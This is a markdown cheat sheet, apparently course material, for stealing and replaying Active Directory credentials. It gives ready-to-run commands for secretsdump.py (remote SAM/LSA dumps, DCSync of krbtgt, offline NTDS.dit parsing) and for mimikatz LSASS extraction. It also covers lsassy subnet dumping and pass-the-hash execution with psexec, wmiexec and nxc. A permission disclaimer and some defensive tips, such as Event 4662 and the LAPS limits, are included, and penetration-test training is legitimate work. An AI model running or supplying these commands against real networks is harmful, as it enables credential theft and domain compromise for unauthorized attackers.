---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Credential Theft & Replay

*Companion to [Module 04 — Credential Theft & Replay](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## secretsdump.py — pull hashes from all three stores

`impacket` syntax: `domain/user:password@target`. Use `-hashes LM:NT` to authenticate *with a hash*
instead of a password (pass-the-hash into the dump itself).

```bash
# Remote — over SMB, needs local admin on the target (dumps SAM + LSA secrets + cached creds)
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.20
secretsdump.py corp.local/administrator@10.10.0.20 -hashes :aad3b...:31d6c...   # PtH into the dump

# DCSync — pull the whole domain from a DC using replication rights (no NTDS.dit on disk)
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.10            # -just-dc for AD accounts only
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.10 -just-dc-user krbtgt   # one account
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.10 -just-dc-ntlm         # NT hashes only

# Offline — from files you already exfiltrated
secretsdump.py -sam SAM -system SYSTEM LOCAL                          # local SAM
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL                    # NTDS.dit + registry hive
```

Output rows are `user:rid:LMhash:NThash:::` — the NT hash (4th field) is the pass-the-hash credential.

## mimikatz — from LSASS on a live Windows host

```
privilege::debug                              # acquire SeDebugPrivilege (needs local admin)
sekurlsa::logonpasswords                      # dump creds/hashes for every session in LSASS
sekurlsa::ekeys                               # Kerberos encryption keys (AES) from memory
lsadump::sam                                  # local SAM hashes
lsadump::dcsync /domain:corp.local /user:krbtgt    # DCSync from mimikatz (needs replication rights)
sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd.exe   # pass-the-hash spawn
```

## lsassy — remote LSASS dumping over the network

```bash
# Dumps LSASS on a remote host (needs admin) and parses creds without touching disk locally
lsassy -u administrator -p 'P@ss' -d corp.local 10.10.0.20
lsassy -u administrator -H :31d6c... 10.10.0.0/24     # spray a subnet, PtH auth
# Also available as an nxc module:
nxc smb 10.10.0.0/24 -u administrator -p 'P@ss' -M lsassy
```

## Pass-the-hash — replay the NT hash, no password

```bash
psexec.py  corp.local/administrator@10.10.0.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
wmiexec.py corp.local/administrator@10.10.0.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
nxc smb 10.10.0.20 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth   # local acct
```

## Gotchas worth remembering

- **The NT hash *is* the credential.** In NTLM you don't need to crack it — possessing it is game over
  for that account. Crack only when you need the plaintext for reuse elsewhere or for Kerberos.
- **Empty NT hash `31d6cfe0d16ae931b73c59d7e0c089c0` = no/blank password.** Seeing it after a DCSync of a
  DC machine account is the Zerologon (CVE-2020-1472) tell — the attacker zeroed it. Patch, don't shrug.
- **SAM ≠ NTDS.dit paths.** Local SAM extraction and DCSync use different code paths and different
  rights (local SYSTEM vs. `Replicating Directory Changes`). AI routinely conflates them — verify.
- **LAPS is not a PtH cure.** It kills the *shared local admin* password, nothing more. A domain account's
  NT hash still sits in LSASS on every host it logged into — that co-location is the tiering problem.
- **DCSync leaves a thin trace: Event 4662** for an account exercising replication rights it has no
  business having. Everything else about the pull looks like normal DC-to-DC replication traffic.
- **PtH needs the NT hash only** — the `LM:` half can be blank (`:NThash`). Passing a bogus LM half is a
  common reason `psexec.py -hashes` silently fails to authenticate.
